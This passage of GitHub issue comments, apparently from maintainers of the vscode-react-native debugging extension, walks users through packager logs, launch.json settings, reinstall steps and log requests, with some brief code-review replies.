\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \n \u2502  Running packager on port 8081.                                            \u2502 \n \u2502                                                                            \u2502 \n \u2502  Keep this packager running while developing on any JS projects. Feel      \u2502 \n \u2502  free to close this tab and run your own packager instance if you          \u2502 \n \u2502  prefer.                                                                   \u2502 \n \u2502                                                                            \u2502 \n \u2502  https://github.com/facebook/react-native                                  \u2502 \n \u2502                                                                            \u2502 \n \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 \nLooking for JS files in\n   c:\\projects_test\\CRNA\n   c:\\projects_test\\CRNA.vscode \nReact packager ready.\n### Packager started.\n\"Warning: You are using npm version 5.3.0. There may be bugs in this version, use it at your own risk. We recommend version 4.6.1.\"\n\"Warning: You are using npm version 5.3.0. There may be bugs in this version, use it at your own risk. We recommend version 4.6.1.\"\nSucessfully ran adb reverse. Localhost urls should work on the connected Android device.Sucessfully ran adb reverse. Localhost urls should work on the connected Android device.Loading dependency graph, done.\n\"Warning: You are using npm version 5.3.0. There may be bugs in this version, use it at your own risk. We recommend version 4.6.1.\"\n\"Warning: You are using npm version 5.3.0. There may be bugs in this version, use it at your own risk. We recommend version 4.6.1.\"\nBundling node_modules\\react-native-scripts\\build\\bin\\crna-entry.js  [development, non-minified, hmr disabled]  100.0% (638/638), done.\nRunning application \"main\" with appParams: {\"rootTag\":1,\"initialProps\":{\"exp\":{\"manifest\":{\"id\":\"@toys/CRNA\",\"sdkVersion\":\"21.0.0\",\"version\":\"0.1.0\",\"packagerOpts\":{\"lanType\":\"ip\",\"minify\":false,\"strict\":false,\"urlRandomness\":\"mb-gmy\",\"hostType\":\"tunnel\",\"urlType\":\"exp\",\"dev\":true},\"mainModuleName\":\"./node_modules/react-native-scripts/build/bin/crna-entry\",\"isVerified\":true,\"xde\":true,\"slug\":\"CRNA\",\"debuggerHost\":\"packager.mb-gmy.toys.crna.exp.direct:80\",\"developer\":{\"projectRoot\":\"c:\\projects\\_test\\CRNA\",\"tool\":null},\"bundleUrl\":\"http://packager.mb-gmy.toys.crna.exp.direct:80/./node_modules/react-native-scripts/build/bin/crna-entry.bundle?platform=ios&dev=true&strict=false&minify=false&hot=false&assetPlugin=expo/tools/hashAssetFiles\",\"env\":{\"EXPO_DEBUG\":\"true\"},\"name\":\"CRNA\",\"logUrl\":\"http://mb-gmy.toys.crna.exp.direct:80/logs\"},\"appOwnership\":\"expo\",\"initialUri\":\"exp://mb-gmy.toys.crna.exp.direct\",\"shell\":false}}}. DEV === true, development-level warning are ON, performance optimizations are OFFRunning application \"main\" with appParams: {\"rootTag\":1,\"initialProps\":{\"exp\":{\"manifest\":{\"id\":\"@toys/CRNA\",\"sdkVersion\":\"21.0.0\",\"version\":\"0.1.0\",\"packagerOpts\":{\"lanType\":\"ip\",\"minify\":false,\"strict\":false,\"urlRandomness\":\"mb-gmy\",\"hostType\":\"tunnel\",\"urlType\":\"exp\",\"dev\":true},\"mainModuleName\":\"./node_modules/react-native-scripts/build/bin/crna-entry\",\"isVerified\":true,\"xde\":true,\"slug\":\"CRNA\",\"debuggerHost\":\"packager.mb-gmy.toys.crna.exp.direct:80\",\"developer\":{\"projectRoot\":\"c:\\projects\\_test\\CRNA\",\"tool\":null},\"bundleUrl\":\"http://packager.mb-gmy.toys.crna.exp.direct:80/./node_modules/react-native-scripts/build/bin/crna-entry.bundle?platform=ios&dev=true&strict=false&minify=false&hot=false&assetPlugin=expo/tools/hashAssetFiles\",\"env\":{\"EXPO_DEBUG\":\"true\"},\"name\":\"CRNA\",\"logUrl\":\"http://mb-gmy.toys.crna.exp.direct:80/logs\"},\"appOwnership\":\"expo\",\"initialUri\":\"exp://mb-gmy.toys.crna.exp.direct\",\"shell\":false}}}. DEV === true, development-level warning are ON, performance optimizations are OFF\n```\nTab with QR code has opened.\nupd. Application also works in Expo app on phone. Dont' repro.\nFeel free to reopen this issue if you still have problem with it.. Hello, @bochen2014!\nIf i right understood you.\nFor debugging app with Chrome please:\n1. Run Run Android on Simulator command from vscode command palette\n2. Open http://localhost:8081/debugger-ui in chrome\nIf Debug JS Remotely enabled on application, debugger will be attached.\nThanks!. Hello @b-szypelow \nThanks for reporting!\nThis issue was resolved in #536 PR.\nWe will release new version of the extension a bit later. . Hello @ssomnoremac \nIntellisense is not controlled by this extension.\nIntellisense for JSX provided by VSCode should work out-of-the box even if you don't have this extension installed.\nPlease see the same issue from vscode repo. Hello @kralcifer-ms \nYou should modify your Debug Android configuration in launch.json\nBy default target property set to simulator, just change(or set) it to device\nPlease, let me know if it's work!. Hello @fmj02 \nUnfortunately, Intellisense is not controlled by this extension, yet.\nPlease see that thread for more info.\n. Hi @bochen2014 \nAre you about this kind of progress?\nBundling `index.ios.js`  [development, non-minified, hmr disabled]  100.0% (304/304), done.\nWe just spawn new process with react-native start command and pipe all outputs in React-Native vscode output channel.\nUnfortunately, we don't get any progress updates, only completed string that looks like string above.\n. @vladimir-kotikov PTAL. Hi @DVSoftware \nThis fixed in #530\nIf react-native not installed in project root, you will get error in DEBUG CONSOLE\nCould not debug. Unable to set up communication with VSCode react-native extension. Is this a react-native project, and have you made sure that the react-native npm package is installed at the root?\nNew version of the extension will be released soon.. React Native version not supported by exponent. Major versions supported: 0.33.0, 0.36.0, 0.37.0, 0.40.0, 0.41.0, 0.42.0, 0.43.0, 0.44.0, 0.45.0, 0.46.1, 0.47.1, 0.48.4, 0.27.0, 0.31.0. @jwargo @vladimir-kotikov Please take a look. LGTM. Hi @Hemsza,\nDo you use vscode-react-native tools?\nLooks like this is problem with react-native, not with vscode tools.\nIf it's true, please move your issue to https://github.com/facebook/react-native repo.\nFeel free reopen this issue if all works fine if you run react-native from terminal and it isn't work with vscode-react-native tools.\nThanks!. Hi @GrandPoohBear \nI can't repro this issue. Could you please update vscode-react-native tools to 0.4.4 and trying again.\nThanks!. OK, seems like two problems there:\n1. Bug in vscode-node-debug2\n2. react-native -v has different outputs on windows and mac\nwindows:\n$react-native -v\nreact-native-cli: 2.0.1\nreact-native: 0.49.3\nmac:\n$react-native -v\nreact-native-cli: 2.0.1\nreact-native: https://github.com/expo/react-native/archive/sdk-22.0.1.tar.gz\nBut we expected semver like version(like on windows).\nWorking on it!\nupd. The same behavior on windows when I update exp. #https://github.com/expo/expo/issues/882. Hi @GrandPoohBear \nJust a friendly ping, do you still have this problem?. Well, it's correct. We've run react-native packager on 8081 port.\nCould you please run exp start -m tunnel in terminal to set default host type as tunnel.\nAfter that you can close terminal window and try debug in vscode\n. Hi @uri3000, quick search haven't gave result(\nI suppose that Expo Github is better place for this question.\nThanks!. Hi @condorman \nPlease see #542. @svekl PTAL. Hi @kralcifer-ms \nWe have always used 'Node Debug 2'.\nCould you please copy output of the React Native: Run iOS output channel (View -> Output -> Select React Native: Run iOS in ListBox).\nThanks!. I found problem. Hi @Gremlin80\nCould you please provide some logs(if you have any of that):\n\nOutput of the Debug Console (View -> Toggle Debug Console):\nPASTE OUTPUT HERE\nOutput of the React-Native output channel (View -> Toggle Output -> Select React-Native in ListBox):\nPASTE OUTPUT HERE\nOutput of the React-Native: Run Android output channel (View -> Toggle Output -> Select React-Native: Run Android in ListBox):\nPASTE OUTPUT HERE\nOutput of the Developer Tools console (Help -> Toggle Developer Tools -> Select Console tab):\nPASTE OUTPUT HERE\n\nThanks!. I do everything the same way, but all works good(. Thank you!\nCould you please trying the same scenario with Chrome Dev Tools\nIs it also hang?. Sad news(\nLooks like it depends on Android SDK version.\nYou can change it to 26 version(make new virtual device), if it's possible, and try again.\nUnfortunately we can't fix that on our side.. Actually not. I'm going to try one more time a bit later on other Android SDKs. All works fine on Android SDK API 26\nOS: win32 x64\nAdapter node: v7.9.0 x64\nvscode-chrome-debug-core: 3.17.3\nStarting debugger app worker.\nEstablished a connection with the Proxy (Packager) to the React Native application\nDebugger worker loaded runtime on port 13308\nRunning application \"AwesomeProject49\" with appParams: {\"rootTag\":1}. __DEV__ === true, development-level warning are ON, performance optimizations are OFF\nDebugger worker loaded runtime on port 19876\nRunning application \"AwesomeProject49\" with appParams: {\"rootTag\":11}. __DEV__ === true, development-level warning are ON, performance optimizations are OFF\nDebugger worker loaded runtime on port 30161\nRunning application \"AwesomeProject49\" with appParams: {\"rootTag\":21}. __DEV__ === true, development-level warning are ON, performance optimizations are OFF\nDebugger worker loaded runtime on port 36070\nRunning application \"AwesomeProject49\" with appParams: {\"rootTag\":31}. __DEV__ === true, development-level warning are ON, performance optimizations are OFF\nDebugger worker loaded runtime on port 39775\nRunning application \"AwesomeProject49\" with appParams: {\"rootTag\":41}. __DEV__ === true, development-level warning are ON, performance optimizations are OFF\nDebugger worker loaded runtime on port 11520\nRunning application \"AwesomeProject49\" with appParams: {\"rootTag\":51}. __DEV__ === true, development-level warning are ON, performance optimizations are OFF\nDebugger worker loaded runtime on port 24199\nRunning application \"AwesomeProject49\" with appParams: {\"rootTag\":61}. __DEV__ === true, development-level warning are ON, performance optimizations are OFF\nDebugger worker loaded runtime on port 24484\nRunning application \"AwesomeProject49\" with appParams: {\"rootTag\":71}. __DEV__ === true, development-level warning are ON, performance optimizations are OFF\nDebugger worker loaded runtime on port 6411\nRunning application \"AwesomeProject49\" with appParams: {\"rootTag\":81}. __DEV__ === true, development-level warning are ON, performance optimizations are OFF\nDebugger worker loaded runtime on port 28725\nRunning application \"AwesomeProject49\" with appParams: {\"rootTag\":91}. __DEV__ === true, development-level warning are ON, performance optimizations are OFF\nDebugger worker loaded runtime on port 39647\nRunning application \"AwesomeProject49\" with appParams: {\"rootTag\":101}. __DEV__ === true, development-level warning are ON, performance optimizations are OFF\nDebugger worker loaded runtime on port 29061\nRunning application \"AwesomeProject49\" with appParams: {\"rootTag\":111}. __DEV__ === true, development-level warning are ON, performance optimizations are OFF\nDebugger worker loaded runtime on port 42335\nRunning application \"AwesomeProject49\" with appParams: {\"rootTag\":121}. __DEV__ === true, development-level warning are ON, performance optimizations are OFF\nDebugger worker loaded runtime on port 8620\nRunning application \"AwesomeProject49\" with appParams: {\"rootTag\":131}. __DEV__ === true, development-level warning are ON, performance optimizations are OFF\nBut sometimes crashes on Android SDK API 23. Fixed #565. LGTM. I believe we can do it.. @waltermvp It isn't work now. Going to implement this on the next week. @timscott \nIf I right understand you, set env file via envFile property:\n {\n            \"name\": \"Debug iOS Demo\",\n            \"program\": \"${workspaceRoot}/.vscode/launchReactNative.js\",\n            \"type\": \"reactnative\",\n            \"request\": \"launch\",\n            \"platform\": \"ios\",\n            \"sourceMaps\": true,\n            \"outDir\": \"${workspaceRoot}/.vscode/.react\",\n            \"envFile\": \"${workspaceFolder}/.env.demo\"\n        },\nAlso, please update extension to 0.5.4. @timscott \nWhich result do you expect?\nlaunch.json:\n{\n            \"name\": \"Debug iOS\",\n            \"program\": \"${workspaceRoot}/.vscode/launchReactNative.js\",\n            \"type\": \"reactnative\",\n            \"request\": \"launch\",\n            \"platform\": \"ios\",\n            \"sourceMaps\": true,\n            \"env\": {\n                \"TEST\": \"123\"\n            },\n            \"envFile\": \"${workspaceFolder}/.env\",\n            \"outDir\": \"${workspaceRoot}/.vscode/.react\"\n        },\n.env:\nTEST1=123\nTEST2=123\nSo, react-native run-ios will be spawn with merged global ENV, variables from launch.json and variables from .env file. @SrikanthKabadi see there.\nOr you can just add fix from PR in your extension that installed in ~/.vscode/extensions/vsmobile.vscode-react-native. You are welcome =). Do you have \"ios\" folder inside your \"--project-path\"? If yes, just modify your launch.json to:\n\"runArguments\": [\n    \"--project-path\", \"../App/ios\"\n]. You should set \"--project-path\" directly to folder with ios native code:\nIt's \"ios\" folder for react-native init project,\nCould you please try to run it from command line, is it work?. Could you please put you ios native into \"../App/ios\" folder, just for test?\nI have idea.. Unfortunately it's very important for us(. Hi @fix777,\nThanks for reporting!\nSeems like this is problem with one of our dependence, it have been already fixed.\nI'm going to release new version of extension a bit later this week.\nIf new version of extension won't fix your issue, feel free to reopen it!\nThanks!. Hi @uriva,\nCould you please fill issue description by template. Also, please check with new version of the extension(0.5.2). @uriva \nJust a friendly ping. Any updates?. close: couldn't repro. Fixed in 0.5.2. Hi @redlock,\nCould you please open new issue and fill it by template. Fixed in 0.5.2. lgtm. Hi @rardoz,\nCould you please add this to your launch.json  \"Debug iOS\" configuration:\n\"trace\": \"verbose\"\nAnd provide some additional logs.\n\nOutput of the \"React Native: Run Ios\" output channel (View -> Toggle Output -> Select \"React Native: Run Ios\" in ListBox).\nOutput of the Debug Console (View -> Toggle Debug Console)\nOutput of the React-Native output channel (View -> Toggle Output -> Select React-Native in ListBox)\n\nThanks!. @rardoz \nPlease send your Debug iOS configuration. @rardoz could you please make test project so that I can repro . Will take a look, thanks!. All works good! Just  run:\n```\n\nnpm install\nreact-native eject\n```\n\nAnd after that run Debug iOS configuration\n\nreact-native tools: 0.5.2\ncode: 1.18.0\nnode: 8.6.0\nyarn: 0.15.1\n. OS: darwin x64\nAdapter node: v7.9.0 x64\nvscode-chrome-debug-core: 3.18.4\nStarting debugger app worker.\nEstablished a connection with the Proxy (Packager) to the React Native application\nDebugger worker loaded runtime on port 21134\nRunning application Spellcaster ({\nRCTLog.js:48\n    initialProps =     {\n    };\n    rootTag = 1;\n})\nRunning application \"Spellcaster\" with appParams: {\"rootTag\":1,\"initialProps\":{}}. __DEV__ === true, development-level warning are ON, performance optimizations are OFF\ninfoLog.js:17\n[PERF ASSETS] Loading image at size {750, 1500}, which is larger than the screen size {750, 1334}\nRCTLog.js:48. You can change that file:\n$HOME/.vscode/extensions/vsmobile.vscode-react-native-0.5.2/src/debugger/nodeDebugWrapper.js\nat line 61 and 137:\nUse whole error to log.. @atkit \nCould you please change nodeDebugWrapper.js as mentioned above and paste output here?. Yes please. That exactly what I do!\nDo you have the same issue with \"Debug Android\" configuration?. I'm not sure. That is another extension\nhttps://marketplace.visualstudio.com/items?itemName=Zignd.html-css-class-completion\nHowever you can try to disable its and check. Guys, looks like I've found problem!. Glad to hear that!. Hi @ishiestar \nPlease paste your Output of the \"React Native: Run Ios\" output channel (View -> Toggle Output -> Select \"React Native: Run Ios\" in ListBox) here. @ishiestar \nLooks like this is output from the React-Native output channel, not React Native: Run Ios. You are welcome!. Hi @Donhv \nPlease paste output of the \"React Native: Run Android\" output channel (View -> Toggle Output -> Select \"React Native: Run Android\" in ListBox) here.\nThanks!. @ishiestar sure) thanks!. @svekl please take a look. Resolved in #593 \nRelease will be soon. Hi @strake7 \nThanks for reporting!\nIssue have been fixed, new release of extension will be soon. Hi @newfylox,\nIntellisense is not controlled by this extension, yet.\nPlease see that thread for more info.. @svekl PTAL. Hi @romk1n \nDoes react-native run-ios --simulator command work fine in terminal?\nCould you please provide some outputs and software versions?. @romk1n \n* Output of the React-Native output channel (View -> Toggle Output -> Select React-Native in ListBox)\nBTW, i couldn't repro this issue after 0.5.7 release. Hi @Jarrio \nCould you please try again with 0.5.5 extension. Hi @gvillenave what error have you seen? Could you please paste output here?\nIs react-native run-ios --simulator --no-packager work for you if you run this in your terminal?. Have been fixed in 0.5.6. @Fernando-Marquardt \nThanks for reporting!\nHave been fixed in 0.5.6. Sorry guys!\nPlease try again with 0.5.7. Hi @MikkelSnitker,\nThanks for reporting! Which configuration did you run? Could you please paste its here?\n. Hi @MrHubble \nCould you please paste outputs here.\n\nOutput of the Debug Console (View -> Toggle Debug Console)\nOutput of the React-Native output channel (View -> Toggle Output -> Select React-Native in ListBox)\nOutput of the React-Native: Android output channel (View -> Toggle Output -> Select React-Native: Android in ListBox)\nOutput of the Developer Tools console (Help -> Toggle Developer Tools -> Select Console tab). Hi @afefer \nDid you open app in Expo after launching? If yes, please check that you enable \"Debug JS Remotely\" in expo app. Closing this for now, feel free to ask any question or reopen if you still have this issue. \n\nThanks!. Hi @scolestock, thanks fo reporting!\nWhich type of project do you use(CRNA/Expo/react-native init)?\nCould you plesase try to run  in terminalreact-native start --port 8081 --root .vscode --assetExts ttf in project folder. Is it work?. Hi @nitishrana28 \nWhich configuration did you launch?\nPlease fill issue by template. Please disable your .Net extensions and try again.\nSeems like that may be cause of crashes. yes, exactly. Does it work from terminal?\nreact-native run-ios. .vscode/.react folder is required. we're create its automatically when you open React-Native project. So looks like you don't have enough rights to do it if you open VSCode from Spotlight.. Is it react-native init project?\nAlso please paste Output of the React-Native output channel (View -> Toggle Output -> Select React-Native in ListBox).\n. @redlock \nSorry for delay.\nLooks like you have run packager outside the vscode:\n[Info] packager is already running.\nCould you please check it and close packager if it's true. And try to run debug ios again from vscode.\nThanks!. Added debugger for react-native-windows in #618 \nFor debugging react-native-windows add new launch.json configuration:\n{\n    \"name\": \"Debug Windows\",\n    \"program\": \"${workspaceRoot}/.vscode/launchReactNative.js\",\n    \"type\": \"reactnative\",\n    \"request\": \"launch\",\n    \"platform\": \"windows\",\n    \"sourceMaps\": true,\n    \"outDir\": \"${workspaceRoot}/.vscode/.react\"\n},\n\nCommand palette commands(show dev menu, restart js) don't work for react-native-windows, but I'm working on it!\n. Hi @garciawarneckee \nIs it CRAN or exp init project?\n\nI've tried falta-uno-app from your Github and it works great for me. Yes, I meant create-react-native-app.\nCould you please check outputs one more time and paste here if not empty\n* Output of the Debug Console (View -> Toggle Debug Console)\n* Output of the React-Native output channel (View -> Toggle Output -> Select React-Native in ListBox)\n* Output of the React-Native: Android output channel (View -> Toggle Output -> Select React-Native: Android in ListBox)\n* Output of the Developer Tools console (Help -> Toggle Developer Tools -> Select Console tab)\nAlso if it possible, could you please create a little project to repro. Hi Egor! @egorshulga \nreact-native.cmd -v is correct command for react-native-cli on Windows.\nCould you please try to run react-native -v from cmd in your project folder, is it work?. Which version of react-native-cli do you use?\nBTW my output:\n$ react-native -v\nreact-native-cli: 2.0.1\nreact-native: 0.52.0\n$ react-native -V\nScanning folders for symlinks in /Users/TOYS/projects/tmp_rn/node_modules (16ms)\n0.52.0. Seems like problem with your CLI, because the latest CLI doesn't output similar error:\n$react-native -DUMMY\nYou did not pass any commands, run `react-native --help` to see a list of all available commands.\nCould you please try to reinstall react-native-cli:\n$ npm uninstall react-native-cli\n$ npm cache clean\n$ npm install -g react-native-cli. Yes!). Remove react-native from global and install react-native-cli. @egorshulga \nIt does! Please see getting started guide. You are welcome). Hi @matthew-an \nCorrect name of launch option is runArguments, please try:\n\n\"runArguments\": [ \"--scheme\", \"HelloWorld_dev\" ]\n\nOr you can use scheme launch option for your purposes:\n\n\"scheme\": \"HelloWorld_dev\". @svekl Please, take a look. Hi @rodrigoelp \n\nI can't repro this.\nCould you please double check that you open exactly react-native project's folder\nAlso please check that this extension installed and no one another extensions haven't needed reload\nThanks!. Hi @dancomanlive \nActually skipFiles  option works, you can use it as mentioned here.\nDo not pay attention to the error - Property skipFiles is not allowed.\nI'll add definition for this option to avoid errors in the future.\nThanks!. If some users have custom react-native than they should implement -v|--version CLI arguments.\nBut they can return version that is not semver compared.\nWe are going to check how we use react-native version inside and what we can do with this.\n. Fixed #737 . Hi there,\nI've faced this issue once, but after reinstall react-native-tools I can't reproduce it anymore.\nSeems like it's some installation issue in vscode which we can't fix from our side.\nCould you please manually delete extension from ~/.vscode/extensions and install again from marketplace. After that React Native should appear as an option for environments(if you don't have ./vscode/launch.json in your project).\nPlease let us know any results!\nThanks!. If you still faced this issue just reinstall the extension from marketplace.\nClosing for now. Feel free to reopen if reinstall doesn't work for you!\nThanks!. Hey, there!\nCould you please check with release 0.6.10\nAll works fine for me:\n\n. Closed. Duplicate of #625. Related to this issue https://github.com/facebook/react-native/issues/14246. Hi @allforabit,\nIt would be better to open a new issue. Please fill it by tempalate.\nThanks!. Hi there,\nPlease see this PR that should solve your issue.\np.s. If you change properties in your settings.json you should restart vscode to apply changes.\nPlease let me know any results!\nThanks!. Hi guys, sorry for delay.\nCouldn't reproduce with Expo SDK v27.0.1, could you please try it?\nAlso please notice this issue and this comment. @MrLoh \nCould you also add \"react-native-tools.logLevel\": \"Trace\" into your workspace settings and restart vscode to apply that, please.. > * Output of the Debug Console:\nempty\n\n\nOutput of the React-Native output channel:\nReact Native not an option to select \n\n\nIt means that you are not in a react-native project or that we couldn't detect it.\nBut if you are have auto-generated launch.json this looks weird. . BTW: with \"react-native-tools.logLevel\": \"Trace\" the React-Native output channel should exists:\n[Debug] Extension messaging server started at /tmp/vscode-reactnative-54ffaa923449e28f152bb1a5b2f8f900cf5a04d2b6e5036c590757c3b6e5160c.sock.. Hi @MrLoh,\nPlease see this issue https://github.com/Microsoft/vscode-react-native/issues/723\nSeems like you have the same problems.. @MrLoh \nSomething like this:\njavascript\nconst child_process = require('child_process');\nchild_process.spawn('react-native', ['start'], {env: process.env});. Hi @pdiaz, thanks for pointing us!. Hi @echeypaz,\nCould you please provide a little sample project, if possible?\nAnd please fill the issue by template\nThanks!. @echeypaz \nJust a friendly ping.. @echeypaz \nHow I can clone app from shoutem builder?\nBTW, is it work from command line?\nreact-native run-android. I've tried to run cloned shoutem app in terminal and no success. \nPlease try react-native run-android on your side.\nClosing this issue for now. Feel free to reopen if all works fine for you from terminal.\nThanks!. Hi @VanessaChu,\nI tested with the latest extension and vscode versions, all works fine for me. \nCould you please provide a bit more info:\n Which configuration did you run?\n Is it reproduce on react-native init project\n Simulator or real device(versions)\n and all what you think may be helpfull\n\nThanks!. @gagaJay\nYou can attach to running CRNA app with this configuration:\n{\n    \"name\": \"Attach to packager\",\n    \"program\": \"${workspaceRoot}/.vscode/launchReactNative.js\",\n    \"type\": \"reactnative\",\n    \"request\": \"attach\",\n    \"sourceMaps\": true,\n    \"port\": \"19001\",\n    \"outDir\": \"${workspaceRoot}/.vscode/.react\"\n}. @VanessaChu \nCould you please paste following outputs here:\n- Output of the Debug Console (View -> Toggle Debug Console):\nPASTE OUTPUT HERE\n- Output of the React-Native output channel (View -> Toggle Output -> Select React-Native in ListBox):\nPASTE OUTPUT HERE\n- Output of the React-Native ios output channel (View -> Toggle Output -> Select React-Native ios in ListBox):\nPASTE OUTPUT HERE\n- Output of the Developer Tools console (Help -> Toggle Developer Tools -> Select Console tab):\nPASTE OUTPUT HERE. @VanessaChu just a friendly ping. Hi @delciopolanco,\nThis extension provide debugger for React Native apps.\nAs I can see your project is angular and you are using Debugger for Chrome.\nI'm sure that https://github.com/Microsoft/vscode-chrome-debug is a better place to open your issue.\nThanks! . I cant' reproduce this. \nClosing for now. Feel free to reopen if you still faced this issue.\nThanks!. Hi @asaravi,\nCould you please run commands below in your project root and paste output here:\nbash\nls -la ./ios\nbash\n/usr/libexec/PlistBuddy -c \"Print:CFBundleIdentifier\" ./ios/build/Build/Products/Debug-iphonesimulator/plexia-mobile.app/Info.plist\nThanks!. Could you also please run:\n/usr/libexec/PlistBuddy -c \"Print:CFBundleIdentifier\" \"./ios/build/Build/Products/Debug-iphonesimulator/plexiaMA.app/Info.plist\"\nI suppose that result will be like:\nPrint: Entry, \":CFBundleIdentifier\", Does Not Exist\nThis goes because we expect that  Debug-iphonesimulator/<app_name>.app/Info.plist should be the same as <app_name>.xcodeproj.\nhttps://github.com/Microsoft/vscode-react-native/blob/14ebf4e6fdee5f69a41d9a7deea4dc164dd28b7e/src/extension/ios/plistBuddy.ts#L25-L33\n. Unfortunately we can't detect app name if it different with project name. If you'd like to use different name you can run app with react-native run-ios and attach with vscode for debug(Attach to packager). Hi @allforabit,\nPlease reset your cache and try again\nhttps://gist.github.com/jarretmoses/c2e4786fd342b3444f3bc6beff32098d\nThanks!. @allforabit any results?. @allforabit \nCould you please run react-native run-android and paste packager outputs here?\nAnd outputs of react-native -v. All clues say that it's issue with watchman's cache, could you please try to reset it in vscode terminal?. Could you please try to debug?\nPlease add following string to your src/common/commandExecutor.js file:\nthis.logger.error(JSON.stringify(spawnOptions.env, null, 2));\nHow to find extension files please see here\nAlso please check, which env vars you have in your command line:\n```\n$ node\n\nprocess.env\n```\n\nPATH vars should be equal. @allforabit \nGlad to hear that!\nYou should be add logging on line 154, my fault, sorry.\nCould you please share how did you fix this issue?\nThanks!. @allforabit \nAny info from logs would be helpful! \nMy main idea is that vscode and cmd uses different environment variables and/or different nodejs versions. \nDo you use nvm or something else for managing nodejs versions? \nUnfortunately I still can't repro this.. @allforabit \nAny updates?. Hi @peterjuras \nThanks for pointing us!\nFixed in #733 . Hi @2hyjun,\nThanks for reaching us! Unfortunately we can't reproduce this issue on default RN app.\nCould you please make a little example project to reproduce? It would be very helpful fo us!\nThanks!. It may depends on your project settings(babel or etc). Could you try to debug your app with chrome ?\n$ react-native run-ios\nAnd Enable JS Debug in app's dev menu. Hi @rodrigoelp \nThanks for reporting! Fix will arrive with a new release.\nAs a workaround you can run packager manually react-native start and after that run debugger from VSCode.\nThanks!. Hi @dominictwlee \nCould you please open terminal in your VSCode and execute react-native -v and paste output here.\nThanks!. @dominictwlee \nCould you please check your settings(both user and workspace settings).\nhttps://code.visualstudio.com/docs/getstarted/settings\nEspecially react-native-tools.projectRoot. @dominictwlee \nCould you please try to delete nvm and install nodejs directly.\nThanks!. When we use spawn and send message from subprocess with process.send({workerLoaded:true}) we get following error:\nSyntaxError: Unexpected token L in JSON at position 0\n    at JSON.parse (<anonymous>)\n    at Pipe.channel.onread (internal/child_process.js:471:28)\nWhile debugging JSON.parse I saw that it got following message Loaded:true}) \nI believe that this issue related to https://github.com/nodejs/node/issues/21671\nBecause of when we use spawn from file running in electron, spawn use system node, instead of fork which use node from electron. Hi @sregg,\nI've added support for this in https://github.com/Microsoft/vscode-react-native/pull/766\nIf you'd like you can try it.(Development setup)\nThanks!. Hi @rsouthgate \nThanks for reaching us.\nCould you please reinstall extension, setup extended logging and try again?\n{\n  \"react-native-tools\": {\n    \"logLevel\": \"Trace\"\n  }\n}\nPlease note that you should reload VSCode window to apply settings changes:\nShift+Cmd+P > Reload Window\nPlease paste outputs here as mentioned in ISSUE_TEMPLATE.md\nThanks!. @rsouthgate \nSeems like you haven't have globally installed react-native-cli\nnpm install -g react-native-cli\nPlease install it and try to debug again.\nThanks. Hi @soeasyjx \nThanks for reaching us! Please fill issue by template and we'd can help you.\nThanks!. Hi @buddhamangler,\nSorry for delay.\nSeems like this issue related for you.\nFor now the only way to debug RN application with VSCode it's install application with\nreact-native run-ios --device \nand after that run \"Attach to packager\" configuration.\nThanks!. Hi @edzillion \nSeems like you have the same issue as me https://github.com/expo/expo/issues/882\nUnfortunately we doesn't support https://github.com/expo/react-native/archive/sdk-28.0.1.tar.gz RN version.\nAs a workaround you can update dependencies to \"react-native\": \"https://github.com/expo/react-native/archive/sdk-29.0.0.tar.gz\".\nI've tested your app with it and breakpoints work well.\nThanks!. Closing for now, feel free to reopen this issue if you still have problem with it.. @edzillion \nIn which place you set up breakpoints(file/line)?\n. Also works for me.\nCould you please send to me your launch.json configuration and settings.json(related props) . and .expo/settings.json from project root. The same as on me :(\nDo you use iOS or Android device for testing ?. Could you please try to delete node_modules folder and reinstall it.. Did you enable Debug Remote JS in your app ?\n\n. See Expo docs. That's exactly like exp run builder. But it can contain arrays\nSee. Doesn't work, a lot of tslint errors(. Doesn't work, a lot of tslint errors(. Doesn't work, a lot of tslint errors(. replace is faster than split + path.posix.join, and with leading slash. It's just a bit refactoring for legacy code. And we discussed about that.. It's incorrect app, and we'll crash, i think it's ok. child_process.spawn is flatted nested arrays, we can get array from app.json or exp.json\nOtherwise we should check typeof value and join it (Array.prototype.join). This is always looks like absolute and trimmed\nc:/project/tests/index.js -> /project/tests/index.js\nOn unix like systems won't diskLetter. https://github.com/Microsoft/vscode-react-native/pull/507/files/37315c47cd153d954c22c9cf543267cd80d95883#diff-e5e546dd2eb0351f813d63d1b39dbc48R26. Without brackets return is excess. Done. Done. Please see https://github.com/Microsoft/vscode-react-native/pull/517/files#diff-a617f538cd4cda30458661c4f3924240R51. I think this pattern !src/**/*.js works fine. Just a back compatibility for us.\nIf run git pull without gulp clean we will get alot of unversioned files.\nThe same as in other places. Maybe check with IOSPlatform.deviceStringis better.. Otherwise LGTM. Done!. Because we have switch-default rule in our tslint.json\nI could remove console.assert if you want it.. Done. What if we wanted add some new stuff? I think it's OK.. I believe it isn't just abstraction over adb, here also implemented some public helper functions.. I believe that's more flexible, but i'm going to implement some interfaces.. The same meaning as already use. Why we should change this now?. Why we can't update to the latest? (1.24.*). However we have a critical bug in 1.20 >= vscode < 1.24 and we're strongly recommend update vscode to the latest, so why we should support vscode with a bug that affect us?. Can we make logger optional?. Why we can't use import * as fs from \"fs\" here?. Please keep static or go and make IOSPlatform.showDevMenu(reloadApp) non static too. Please point they to me, thanks!. I believe that the same methods from different platforms may be static or not. But they should be the same type. Thanks for testing!\nActually we can fill runArguments like : \n\"runArguments\": [\n    \"--simulator\", \"iPhone X\",\n    